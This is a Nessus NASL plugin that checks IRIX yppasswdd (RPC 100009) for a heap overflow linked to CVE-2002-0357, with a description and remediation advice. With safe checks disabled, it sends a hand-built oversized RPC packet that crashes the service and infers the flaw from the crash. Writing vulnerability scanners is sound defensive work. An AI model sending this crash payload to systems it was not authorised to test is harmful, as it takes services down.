#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# This is *NOT* the issue described in CVE-2002-0357, which happens
# to be a logic error for which details have not been leaked at all.
#
#
#
# This script is released under the GPLv2
#

if(description)
{
 script_id(11021);
 script_bugtraq_id(4939);
 script_cve_id("CVE-2002-0357");
 
 script_version ("$Revision: 1.11 $");

 
 name["english"] = "irix rpc.passwd overflow";
 name["francais"] = "irix rpc.passwd overflow";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote RPC service 100009 (yppasswdd) is vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

Solution : disable this service if you don't use
it, or see SGI advisory #20020601-01-P
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "heap overflow through rpc.passwd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK); 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("rpc_portmap.nasl", "yppasswdd.nasl");
 script_require_keys("rpc/portmap");
 script_exclude_keys("rpc/yppasswd/sun_overflow");
 exit(0);
}

include("misc_func.inc");

n = get_kb_item("rpc/yppasswd/sun_overflow");
if(n)exit(0);


function ping(len)
{
 crp = crap(len-4);
    
    len_hi = len / 256;
    len_lo = len % 256;
    
    req = raw_string(0x56, 0x6C, 0x9F, 0x6B, 
    		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x00, 0x01, 0x86, 0xA9, 0x00, 0x00, 0x00, 0x01,
		     0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, len_hi, len_lo, 0x80, 0x1C, 0x40, 0x11
		     ) + crp + raw_string(0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00);
     send(socket:soc, data:req);
     r = recv(socket:soc, length:28);
     if(strlen(r) > 1)return(1);
     else return(0);
}

port = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
if(port)
{
  if(!safe_checks())
  {
  if(get_port_state(port))
  {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    p1 = ping(len:80);
    if(p1)
    {
     p2 = ping(len:4000);
     if(!p2)
     {
      p3 = ping(len:80);
      if(!p3)security_hole(port:port, protocol:"udp");
     }
     }
   }
  }
 }
 else
 {
  desc = "
The remote RPC service 100009 (yppasswdd) may be vulnerable
to a buffer overflow which would allow any user to obtain a root
shell on this host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : disable this service if you don't use
it, or see SGI advisory #20020601-01-P
Risk factor : High";
  security_hole(port:port, data:desc, protocol:"udp");
 }
}
